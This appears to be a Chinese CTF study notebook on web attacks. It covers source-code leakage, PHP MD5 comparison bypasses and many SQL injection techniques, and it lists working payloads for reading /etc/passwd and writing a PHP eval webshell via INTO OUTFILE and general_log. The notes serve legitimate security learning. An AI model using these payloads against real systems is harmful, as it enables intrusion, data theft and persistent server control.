    <from>@re</from>
    <head>v3ry</head>
    <body>g00d!</body>
    </note>

    ------test.dtd

    <!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
    <!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
    <!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
    <!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->

    ```

    - PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。

* DTD元素

    |声明一个元素|`<!ENTITY 元素名称 类别>`|`<!ELEMENT 元素名称(元素内容)>`|
    |:-:|:-:|:-:|
    |空元素|`<!ENTITY 元素名称 EMPTY>`|`<!ELEMENT <br> EMPTY </br>>`|
    |只有PCDATA的元素|`<!ENTITY 元素名称 (#PCDATA)>`|`<!ELEMENT from (#PCDATA)>`|
    |带有任何内容的元素|`<!ENTITY 元素名称 ANY>`|`<!ELEMENT note ANY>`|
    |带有子元素(序列)的元素|`<!ENTITY 元素名称(子元素名称1)>`|`<!ELEMENT note(to,from,heading,body)>`|

* DTD属性

    属性声明使用以下语法

    `<!ATTLIST 元素名称 属性名称 属性类型 默认值>`
    
    DTD实例

    `<!ATTLIST payment Hu3sky CDATA "H">`
    
    XML实例

    `<payment Hu3sky="H" />`

* DTD实体(重要)

    实体是用于定义引用普通文本或特殊字符的快捷方式的变量。

    实体引用是对实体的引用。

    实体可以在内部或外部进行声明

    内部实体

    `<!ENTITY 实体名称 "实体的值">`
    外部实体

    `<!ENTITY 实体名称 SYSTEM "URL">`
    参数实体

    `<!ENTITY %实体名称 "值">`
    or

    `<!ENTITY %实体名称 SYSTEM "URL">`

    

# 源码泄露

## 常用备份文件后缀

* .phps

    >`phps`文件就是`php`的源代码文件，通常用于提供给用户(访问者)查看`php`代码，因为用户无法直接通过浏览器看到`php`文件内容，所以需要用`phps`文件代替。
    >它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。

* .rar

* .zip

    www.zip(网站源码文件)

* .7z

* .tar.gz

* .bak

* .swp

    vim 编辑文件过程中，自动在当前目录生成一个.swp结尾的临时交换文件，用于备份缓冲区中的内容

* .txt

* .html

>参见[ctf/web源码泄露及利用办法【总结中】](https://blog.csdn.net/wy_97/article/details/78165051?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)

## 源码泄露

>[CTF常见源码泄漏总结](https://www.shuzhiduo.com/A/amd0q8A2zg/)

* .hg源码泄漏

    当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。

    `hg init`的时候会生成`.hg`
    
    工具:`dvcs-ripper`

    `rip-hg.pl -v -u http://`

    `grep -r <指定字符串> <指定目录>` 在指定目录下搜索对应字符串，如果没指定目录就在当前目录下寻找

* .git源码泄漏

    漏洞成因： 
    在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。

    url/.git/config

    [Githack](https://github.com/BugScanTeam/GitHack)

    `python3 githack.py http://xxxx/.git/`

    [scrabble](https://github.com/denny0223/scrabble)

    linux: `/scrabble <url>`

    ```shell

    git log --stat  #查看git历史提交

    git log --all   #查看所有分支

    git log reflog  #查看所有分支的所有操作记录

    git reset --hard <id> #回滚到某个commit

    git diff <id>  #对比当前分支与某个分支的区别

    git stash list # 列出备份文件

    git stash pop #从Git栈中读取最近一次保存的内容，恢复工作区的相关内容，由于可能存在多个Stash的内容，所以用栈来管理，pop会从最近的一个stash中读取内容并恢复。
    ```

* .DS_Store文件泄漏

    .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。

    url后加/.DS_Store下载.DS_Store文件，在linux下cat一下

* SVN导致文件泄露

    .svn
    工具：`dvcs-ripper`  github搜索
    
    [dvcs-ripper](https://github.com/kost/dvcs-ripper)

    概要：Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。 Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。
    
    使用SVN管理本地代码过程中，会生成一个名为.svn的隐藏文件夹，其中包含重要的源码信息。
    
    出现原因：网站管理员在发布代码时，没有使用导出功能，直接进行复制粘贴。
    
    漏洞例子：`xxxx/.svn/entries`

    `perl ./rip-svn.pl -v -u http://xxxxx/.svn`

    `tree .svn`

    `cat .svn/xxxxxx`直接输出指定文件即可

* CVS泄漏

    漏洞利用: 
    http://www.am0s.com/CVS/Root 返回根信息
    http://www.am0s.com/CVS/Entries 返回所有文件的结构
    
    取回源码的命令
    `bk clone http://www.am0s.com/name dir `
    这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。 查看所有的改变的命令，转到download的目录
    
    `bk changes` 

* vim文件泄露

    默认情况下使用vim编程，在修改文件后系统会自动生成一个带`~`的备份文件，某些情况下可以对其进行下载查看`index.php~`

    `vim`中的`swp`即`swap文件`，在编辑文件时产生，它是隐藏文件，如果原文件为`submit`，则它的链式文件为`.submit.swp`，如果文件正常退出，则此文件自动删除。

### WEB-INF/web.xml泄露
>[[RoarCTF 2019]Easy Java](https://www.cnblogs.com/wangtanzhi/p/12173215.html)

* 概念

    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 
    
    
    `WEB-INF`是`Java`的`WEB应用的安全目录`。所谓安全就是`客户端无法访问`，只有`服务端可以访问`的目录。如果想在页面中直接访问其中的文件，必须通过`web.xml`文件对要访问的文件进行`相应映射`才能访问。

    `Java Servlet` 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。

    * `servlet`
        
        使用 `Servlet`，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。

    * Servlet 执行以下主要任务：

        读取客户端（浏览器）发送的显式的数据。这包括网页上的 HTML 表单，或者也可以是来自 `applet` 或自定义的 HTTP 客户端程序的表单。
        读取客户端（浏览器）`发送的隐式的 HTTP 请求数据`。这包括 cookies、媒体类型和浏览器能理解的压缩格式等等。
        处理数据并生成结果。这个过程可能需要访问数据库，执行 RMI 或 CORBA 调用，调用 Web 服务，或者直接计算得出对应的响应。
        `发送显式的数据（即文档）到客户端（浏览器）`。该文档的格式可以是多种多样的，包括文本文件（HTML 或 XML）、二进制文件（GIF 图像）、Excel 等。
        `发送隐式的 HTTP 响应到客户端（浏览器）`。这包括告诉浏览器或其他客户端被返回的文档类型（例如 HTML），设置 cookies 和缓存参数，以及其他类似的任务。


* 包含内容

    `/WEB-INF/web.xml`Web应用程序配置文件，描述了`servlet`和其他得应用组件配置及命名规则

    `/WEB-INF/classes/`包含了站点所有用的`class`文件，包括`servlet class`和`非servlet class`，他们不能包含在`.jar`文件中(是该目录不能包含在`.jar`文件中)

    `/WEB-INF/lib/`存放`web应用`需要的各种JAR文件，放指仅在这个应用中要求使用的jar
    文件，如`数据库驱动jar文件`

    `/WEB-INF/src/`源码目录，按照包名结构放指各个`java`文件。

    `/WEB-INF/database.properties`数据库配置文件

    `/WEB-INF/tags/`存放了自定义标签文件，该目录并不一定为`taags`，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。

    `/WEB-INF/jsp/`jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。

    `/WEB-INF/jsp2/`与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。

    `META-INF`相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务
　　manifest.mf文件，在用jar打包时自动生成。

* 利用方法

    通过找到`web.xml`文件，推断`class文件`的路径，最后直接下载`class文件`，在通过`反编译class文件`，得到网站源码。

    在线java反编译网站`http://javare.cn/`

    例如：/WEB-INF/web.xml

    ```xml

    <servlet>
            <servlet-name>FlagController</servlet-name>
            <servlet-class>com.wm.ctf.FlagController</servlet-class>
        </servlet>

    ```

    访问:

    ```url

    filename=/WEB-INF/classes/com/wm/ctf/FlagController.class

    ```

    一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！

    

## 数据库泄露
### asp+access

* `/db/db.mdb`


# 常见函数绕过
## md5函数绕过
>参见[MD5绕过的技巧 ](https://www.cnblogs.com/hacker-snail/p/13955722.html)

* MD5函数特性

    ```php
    $str1 = $_GET['str1'];
    $str2 = $_GET['str2'];
    if (md5($str1) == md5($str2)){
    die('OK'); }
    ```

    通过构造经过`MD5`加密后为`0e`开头的字符串会被认定为`0`的科学计数法，不管多少次方都为`0`，从而达成等价条件

    * MD5值为`0e`开头的字符串

        QNKCDZO
        240610708
        s878926199a
        s155964671a
        s214587387a

    * MD5值和双MD5值开头都为`0e`

        CbDLytmyGm2xQyaLNhWn
        770hQgrBOjrcqftrlaZk
        7r4lGXCH2Ksu2JNT3BYM

    * sha1值为`0e`开头

        绕过sha1函数也可以传数组，弱比较
        aaK1STfY
        aaO8zKZF  

* PHP特性

    >上面的代码用到的是`==`(弱比较、松散比较)，现在使用`===`(严格比较)

    ```php
    $str1 = $_GET['str1'];
    $str2 = $_GET['str2'];

    if (md5($str1) === md5($str2)) {
    die('OK');
    }
    ```


    强比较不仅比较两者的值，还会比较两者的类型
    而弱比较进行值比较之前还会先转化为相同类型

    * 这时候可以使用传数组的方法，使得`md5`函数返回`NULL`，然后两false等价，绕过对比

* MD5碰撞

    ```php
    $str1 = (string)$_GET['str1'];
    $str2 = (string)$_GET['str2'];

    if (md5($str1) === md5($str2)) {
    die('OK');
    }
    ```

    有`string`强制类型转换，传数组不可行，这里需要`MD5碰撞`，给两个内容不同但是`MD5值`相同的文件，使用`fastcoll`进行相同值md5文件生成，非常迅速

    `a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2`

    `b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`

    两者变成这样这样就可以绕过⬆爆出来的

* 绕过`md5()`构造攻击语句

    利用字符串生成md5值，md5值某一部分经16进制转换成为SQl语句闭合，mysql正好把它当作16进制字符串解析，从而造成闭合问题达成注入

    ```php
    select * from 'admin' where password=md5($pass,true)
    ```
    
    * 常用字段

    `129581926211651571912466741651878684928`md5再16进制为`ڔ0D㟁'or'8`

    `ffifdyop`md5再16进制为`'or'6ɝ⬹�` 





# SQL注入

>[极其重要参考-->数据库注入提权总结](https://zhuanlan.zhihu.com/p/551718071)
>SQL注入一方面主要是考虑如何构造第二个查询语句，不要局限于第一个语句


## 右查询
right join

将返回右表中所有记录，不管前表中有没有


## 堆叠注入
>ctfshow 195
* 用法

    堆叠注入的利用场景也是有限的，在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。只有查询之后能返回多条查询语句结果才可以利用。

    将所有的语句一次性输入完毕，否则SQL语句可能出现找不到表名的错误
    ```php

    username=0x61646d696e;update`ctfshow_user`set`pass`=0x313131;&password=0x313131
    ```
### Handler
>https://www.cnblogs.com/gaonuoqi/p/12398554.html
>ctfshow 225、强网杯2018随便注
* 概念

    mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。

* 用法

    利用`handler`方法,其作用是`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭,也就是可以通过这种方法直接访问表中的内容

    ```php
    /api/?username=';show tables;-- -

    /api/?username=';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;-- -
    
    `1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#` 
    
    ```

### 预处理
>https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450
>ctfshow 226、ctfshow 228-230、强网杯2018随便注

* 概念

    一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL），具体如下

    1.词法和语义解析；
    2.优化 SQL 语句，制定执行计划；
    3.执行并返回结果；

    预编译语句的优势在于归纳为：*一次编译、多次运行*，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。

* 方法

    ```php
    PREPARE name from '[my sql sequece]';   //预定义SQL语句
    EXECUTE name;  //执行预定义SQL语句
    (DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
    ```
    `?username=user1';PREPARE sprint from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE sprint;`十六进制为(select group_concat(table_name) from information_schema.tables where table_schema=database())

    注意，转十六进制使用https://www.sojson.com/hexadecimal.html，BEJSON有点不准

## 宽字节注入

* GBK解码过程
    
    读取第一个字节，判断它的值是否在0xB0至0xF7之间。如果是，则说明这个字符是一个汉字的高位字节，需要继续读取下一个字节作为低位字节，然后将它们组合起来得到一个完整的汉字字符。

    如果第一个字节的值不在0xB0至0xF7之间，那么它就是一个其他字符的编码。如果它的值在0x00至0x7F之间，那么它就是一个ASCII字符，直接将它转换成对应的字符即可。如果它的值不在0x00至0x7F之间，那么它就是一个扩展字符，需要查找对应的扩展字符表来进行解码。

    重复以上步骤，直到整个字符串都被解码完毕。

* 原理

    宽字节占用两个字节，普通字符占用一个字节，而页面在解码的时候将一个宽字节分为两个普通字节来解码，导致包含单引号的字节逃逸

    宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入

    过滤sql注入的函数例如`mysql_escape_strings()`、`mysql_real_escape_strings()`、`addslashes()`
    会在单引号前添加反斜杠对其进行转义，当PHP编码用单字节编码而mysql用双字节编码，在单引号前加`%D3`可以与其后将会出现的反斜杠转义符进行拼合解析为一个双字节字符，从而达到单引号逃逸的目的

    admin'   admin\'
    admin%D3' or 1=1 #
    admin%D3\' or 1=1 #
    admin%D3%5C' or 1=1 #

    `%D3%27` 导致分开解码，后面的单引号逃逸

* 一段测试代码

    ```python

    # GBK encoded bytes
	gbk_bytes = b'\xdf\x5c'

	# decode GBK to Unicode string
	decoded_str = gbk_bytes.decode('gbk')

	print(decoded_str)  # 输出: 運

    #%d5%5c  誠


    ```

## 报错注入

* `floor()`

    floor(rand()*2)

    `floor()`函数作用是返回`小于等于`该值的最大整数，只保留整数部分

    `rand()`函数作用，生成一个大于等于`0`，小于所给参数的值，默认生成`[0,1)`

    `rand(0)`生成伪随机数，每次生成的随机数都是一样的，所以利用这一特点报错注入

    `group by`函数特性:进行数据整合之前会将每行数据逐条读入一个虚表中，先根据数据库中的内容对虚表进行查询，如果虚表内没有这一条数据就进行插入操作，如果有就更新`count(*)`(自己加的函数),经过`rand()`计算伪随机数造成查询插入两个过程的键值不一样，将0键值插入到虚表的1键值上导致键值重复而产生的报错

    * 用法

    `floor(rand(0)*2)`生成的伪随机数列为`0,1,1,0,1,1`（这前六位是固定的）


    `select null,count(*),group_concat((select database()),floor(rand(0)*2)) as a from information_schema.schemata group by a --+`

    `?id=0' union select null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.schemata group by a --+`

* `updatexml()`

    `updatexml(XML_DOCUMENT,X_PATH_STRING,new Value)`是这个函数的正确用法，当用户输入与其格式不符的数据时就会发生报错，其中更新路径必须遵循xpath结构，如果不遵循就会出现报错，xpath结构不允许出现特殊符号如冒号，感叹号等，常用方法

    `updatexml(1,(concat('~',(select database()),'~')),1)`
    `updatexml(1,concat('~',(select(group_concat(left(password,30)))from(H4rDsq1)),'~'),1)#`

* `extractvalue()`

    `extractvalue(XML_DOCUMENT,X_PATH_String)`是这个函数的正确用法

* `geometrycollection()`

    `select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));`

* `multipoint()`

    `select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));`
    
* `polygon()`

    `select * from test where id=1 and polygon((select * from(select * from(select user())a)b));`

* `multipolygon()`

    `select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));`

* `linestring()`

    `select * from test where id=1 and linestring((select * from(select * from(select user())a)b));`

* `multilinestring()`

    `select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));`

* `exp()`

    exp()数学函数，用于计算e的1x次方，但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。
    
    将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值

    `select ~(select database())`

    `select * from test where id=1 and exp(~(select * from(select user())a));`

>concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。

* 报错注入显示字符串长度限制
    
    >updatexml函数返回32个字符

    利用`left`和`right`左右拼接

## UPDATE 注入
>ctfshow 231
* 概念

    不同于平常的查询语句，注入点出现在更新语句UPDATE中，使得查询结果能够展现在列数据库信息的位置

* 实例

    `$sql = "update ctfshow_user set pass = md5('{$password}') where username = '{$username}';";`

    payload:`password=1'),username=(select group_concat(flagass) from flagaa) where 1=1#&username=1`

## 盲注

### Bool盲注
>ctfshow 190

* `left($x,y,z)`

    从字符串x的第y个位置截取z个字符，如果没有设置z，就默认为从第y个字符截取到末尾

* `chr()`

    将对应的ascii码转为字符

* `ascii()`

    获取字符的ascii码值
    与之功能相同的函数是`ord()`

* `ord()`

    获取字符的ascii码值

* `length()`

    获取字符串长度

* `substr($string,0,1)`

    从字符串`string`的第一个位置截取长度为1的字符串

* 使用

    ```SQL
    
    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
    

    admin123' UNION SELECT SLEEP(5),2 from users where username like ‘admin’ and password like ‘4961’;
    ```

### 时间盲注

* `sleep(x)`

    页面休眠`x`秒

* `benchmark(,sha(1))`
    
    >https://www.cnblogs.com/c1e4r/articles/9060525.html

    benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式

    通过数次执行后面函数来起到延时的作用

    `select benchmark(10500000,md5('a'));`1.5秒
    `select benchmark(15000000,md5('a'));`2.18秒

* `heavy query`

    >https://www.sqlinjection.net/heavy-query/
    顾名思义以就是通过大量的查询导致查询时间较长来达到延时的目的，通常选择一些比较大的表做笛卡尔积运算

* 注意

    `python2`中，`/`表示浮点数除法，返回一个浮点数结果，`//`表示整数除法，要引入`from __future__ import division`

    `python3`中含义不变，不需要引入库
    
### 异或盲注

>[极客大挑战 2019]FinalSQL

当题目过滤`and、union`，可以考虑使用异或规则来判断查询结果真假

规则：`1^1=0,1^0=1,0^0=0`

* 应用
    ```SQL

    #检测数据库名长度
    id=0^(length(database())<4)#

    #检测数据库名
    id=0^(ord(substr(select(database()),1,1))>32)#

    #检测表名
    id=0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),1,1))>32)#

    #检测字段名
    id=0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),1,1))>32)#

    #检测内容
    id=0^(ord(substr((select(group_concat(password))from(F1naI1y)),1,1))>32)#

    ```

### order by 盲注

* 原理

    `order by rand(True)和order by rand(False)`的结果排序是不同的，可以根据这个不同来进行盲注：

    例：`order by rand(database()='pdotest')`
    返回了True的排序，说明database()=’pdotest’是正确的值

### 函数存储过程
>[MySQL——查看存储过程和函数]https://blog.csdn.net/qq_41573234/article/details/80411079
>ctfshow 227

* 查看存储过程和函数的状态

    `show {PROCEDURE | FUNCTION} STATUS [LIKE 'pattern']`

    SHOW STATUS 语句是  MySQL 的一个扩展。它返回子程序的特征，如数据库、名字、类型、创建者及创建和修改日期。如果没有指定样式，根据使用的语句，所有的存储程序或存储函数的信息都会被列出。PROCEDURE  和  FUNCTION  分别表示查看存储过程和函数；LIKE  语句表示匹配存储过程或函数的名称。

* 查看存储过程和函数的定义

    除了`SHOW STATUS`之外，还可以使用`SHOW CREATE`语句查看存储过程和函数的状态。

    `SHOW CREATE {PROCEDURE | FUNCTION} sp_name`

    SHOW CREATE 语句是Mysql 的一个扩展，类似于SHOW CREATE TABLE ,它返回一个可用来重新创建已命名子程序的确切字符串。PROCEDURE 和 FUNCTION分别表示查看存储过程和函数;LIK语句表示匹配存储过程或函数的名称。

* 查看存储过程和函数的信息

    在  MySQL 中，存储过程和函数的信息存储在  `information_schema`  数据库下的  `Routines  表`中，可以通过查询该表的记录来查询存储过程和函数的信息，其基本的语法形式如下:

    `SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME='sp_name';`

    其中，ROUTINE_NAME字段种存储的是存储过程和函数的名称;sp_name参数表示存储过程或函数的名称。




## 其他注
>[没见过的注入？]https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5
### limit 注入(PROCEDURE)

* `PROCEDURE analyse()`

    >https://www.jb51.net/article/99980.htm
    是MySQL内置的对MySQL字段值进行统计分析后给出建议的字段类型

* 语法

    `procesure analyse(max_elements,max_memory)`

    `max_elements`

    指定每列非重复值的最大值，当超过这个值的时候，MySQL不会推荐enum类型。
    
    `max_memory`
    
    analyse()为每列找出所有非重复值所采用的最大内存大小。

* payload

    `limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);`

### group by 注入
* 概念

    group by 用来结合合计函数，根据一个或者多个列对结果集进行分组

### 文件名注入

* 文件名传入数据库，查询导致注入，见题发挥
 
    `payload.bin`，写入一句话，适用于截取文件type并显示的题

### 分割注入

常见场景,登录处SQL语句如下，注释符号被过滤

`select xxx from xxx where username=’xxx’ and password=’xxx’`

* 方法一

    ```sql
    username=1' or extractvalue/*
    password=1*/(1,concat(0x7e,(select database()),0x7e))or'

    SQL语句最终变为
    select xxx from xxx where username='1' or extractvalue/*’ and password=’*/(1,concat(0x7e,(select database()),0x7e))or''
    ```

* 方法二

    ```sql
    username=1' or if(ascii(substr(database(),1,1))=115,sleep(3),0) or '1
    password=1
    select * from users where username='1' or if(ascii(substr(database(),1,1))>0,sleep(3),0) or '1' and password='1'
    ```

## 正则注入

* regexp

    作用类似于like关键字，使用方法

    ```sql
    
    and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="security" AND table_name REGEXP '^e' LIMIT 0,1) 

    ```

* 参考脚本

    

## 无列名注入

>ctfshow 235 236
>https://zhuanlan.zhihu.com/p/98206699

* 概述

    无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。

* 操作

    ```php
    payload:`select `3` from (select 1,2,3 union select * from admin)a;`
    ```
    原本的列名是id,username,password,使用第一个`select`之后就将列名命名为1,2,3，再`select * `就会将所有信息输出但是列名变为1，2，3,所以选中3就是选中了password一列
    ![](.\CTF\wulieming.jpg)

* 换别名

    >当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：
    ```php

    payload:`select b from (select 1,2,3 as b union select * from admin)a;`
    ```
* 同时查多个列

    ```php
    
    payload:`select concat(`2`,x02d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;`
    ```

## information_schema过滤

* innoDB绕过

* sys MySQL5.7新特性

    5.7版本新增sys schema ,数据来源于performance_schema和information_schema

    sys库中存有大量视图

    * sys.schema_auto_increment_columns

        该视图的作用简单来说就是用来对表自增ID的监控。
        
    
## SQL读写文件

* 读写权限

    在进行MySQL文件读写操作之前要先查看是否拥有权限，mysql文件权限存放于mysql表的file_priv字段，对应不同的User，如果可以读写，则数据库记录为Y，反之为N：

    `select * from mysql.user`

    我们可以通过user()查看当前用户是什么，如果对应用户具有读写权限，则往下看，反之则放弃这条路找其他的方法。

    `show grants`查看当前用户权限
    `show grants for <用户名>`查看对应用户权限

    除了要查看用户权限，还有一个地方要查看，即secure-file-priv。它是一个系统变量，用于限制读写功能，它的值有三种：

    ```php

    （1）无内容，即无限制
    （2）为NULL，表示禁止文件读写
    （3）为目录名，表示仅能在此目录下读写
    ```
    
    该配置项存放在my.ini中，修改之后必须重启mysql重新加载配置文件

* 读文件

    满足以上两个条件就可以尝试读写文件

    常用读文件的语句有如下几种：

    ```sql

    select load_file(file_path);
    load data infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n'; #读取服务端文件
    load data local infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n'; #读取客户端文件
    ```

    需要注意的是，file_path必须为绝对路径，且反斜杠需要转义

    默认读16mb内容，通过更改配置文件可以读1GB文件

    也可以用十六进制替换：

    `select load_file(0x2f6574632f706173737764)`

* 写文件

    ```sql
    select 1,"<?php eval($_POST['cmd']);?>" into outfile '/var/www/html/1.php';
    select 2,"<?php eval($_POST['cmd']);?>" into dumpfile '/var/www/html/1.php';
    ```

    当secure_file_priv值为NULL时，可用生成日志的方法绕过：

    ```sql
    set global general_log_file = '/var/www/html/1.php';
    set global general_log = on;
    ```

## SQL注入写shell   

* 条件

    数据库当前用户为root权限
    知道当前网站的绝对路径
    PHP的GPC为off状态
    写入的那个路径存在写入权限

* 联合查询

    ```sql
    ?id=1 union select 1,'<?php phpinfo();?>',3 into outfile '网站根目录绝对路径'-- qwe
    ?id=1 union select 1,'<?php phpinfo();?>',3 into dumpfile '网站根目录绝对路径'-- qwe
    ```

* 非联合查询

    `?id=1 into outfile '网站根目录绝对路径' FIELDS TERMINATED BY '<?php phpinfo();?>'-- qwe`
    
    这个语句的意思是，导出当前数据表到xxx文件中，数据表中的字段以<?php phpinfo();?>分隔

    `id username password` 导出后会变成
    `id<?php phpinfo();?>username<?php phpinfo();?>password`

* `outfile`和`dumpfile`的区别

    >outfile

    ```

    1.支持多行数据同时导出
    2.使用union联合查询时，要保证两侧查询的列数相同
    3.会在换行符制表符后面追加反斜杠
    4.会在末尾追加换行
    ```

    >dumpfile

    ```

    1.每次只能导出一行数据
    2.不会在换行符制表符后面追加反斜杠
    3.不会在末尾追加换行
    ```

    因此，dumpfile函数这个函数来顺利写入二进制文件，当然into outfile函数也可以写入二进制文件，但是无法生效（追加的反斜杠会使二进制文件无法生效），当使用dumpfile函数时，应该手动添加limit限制来获取不同的行数。

* `secure_file_prive`

    * 基本配置:

        ```sql

        secure_file_prive= ，结果为空的话，表示允许任何文件读写
        secure_file_prive=NULL，表示不允许任何文件读写
        secure_file_prive=‘某个路径’，表示这个路径作为文件读写的路径
        在mysql5.5版本前，都是默认为空，允许读取
        在mysql5.6版本后 ,默认为NULL，并且无法用SQL语句对其进行修改。所以这种只能在配置进行修改。
        ```

    * 查询该参数配置情况:

        `show global variables like "%secure%"`

    * 利用sql语句修改配置项(5.6版本以前临时修改重启失效)

        `set global secure_file_prive=""`
    
    * 5.6版本以后只能利用配置项修改

## 日志GetShell

* 全局日志getshell

    >利用general_log，可以将所有到达mysql服务器的sql语句，都记录下来

    ```sql

    # 查看日志是否开启
    show variables like 'general_log';

    # 开启日志功能
    set global geeral_log=on;

    # 查看文件日志保存位置
    show variables like 'general_log_file';

    # 设置日志保存位置（getshell的话存放在网站根目录，名为.php）
    set global general_log_file='/var/www/html/shell.php';

